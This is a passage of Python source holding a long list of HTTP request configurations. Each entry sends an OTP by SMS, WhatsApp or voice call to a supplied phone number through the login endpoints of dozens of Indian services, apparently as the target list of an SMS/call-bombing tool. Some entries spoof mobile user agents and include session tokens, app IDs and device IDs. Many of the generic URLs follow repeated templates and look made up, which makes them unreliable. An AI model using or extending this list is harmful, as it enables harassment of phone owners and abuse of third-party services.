    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},

    # ─── From third code block (API_CONFIGS) ───
    {
        "name": "lenskart_2",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "gopinkcabs_2",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "shemaroome_2",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "Referer": "https://www.shemaroome.com/users/sign_in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f"mobile_no=%2B91{p}"
    },
    {
        "name": "kpnfresh_web_3",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "kpnfresh_and_2",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
    },
    {
        "name": "bikefixup_2",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "rappi_2",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
    },
    {
        "name": "stratzy_sms_2",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login"
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "stratzy_wa_2",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login"
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "wellacademy_2",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in",
            "referer": "https://wellacademy.in/store/"
        },
        "data": lambda p: f'{{"contact_no":"{p}"}}'
    },
    {
        "name": "hungama_2",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "name": "servetel_3",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
        },
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "merucab_2",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "beepkart_2",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "origin": "https://www.beepkart.com",
            "referer": "https://www.beepkart.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'
    },
    {
        "name": "lendingplate_2",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://lendingplate.com",
            "Referer": "https://lendingplate.com/personal-loan",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
    },
    {
        "name": "snitch_2",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "Referer": "https://www.snitch.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
    },
    {
        "name": "dayco_2",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
    },
    {
        "name": "penpencil_3",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "imaginestore_2",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myimaginestore.com",
            "referer": "https://www.myimaginestore.com/"
        },
        "data": lambda p: f"mobile={p}"
    },
    {
        "name": "nobroker_2",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f"phone={p}&countryCode=IN"
    },
    {
        "name": "cossouq_2",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.cossouq.com",
            "referer": "https://www.cossouq.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
    },
    {
        "name": "shiprocket_4",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
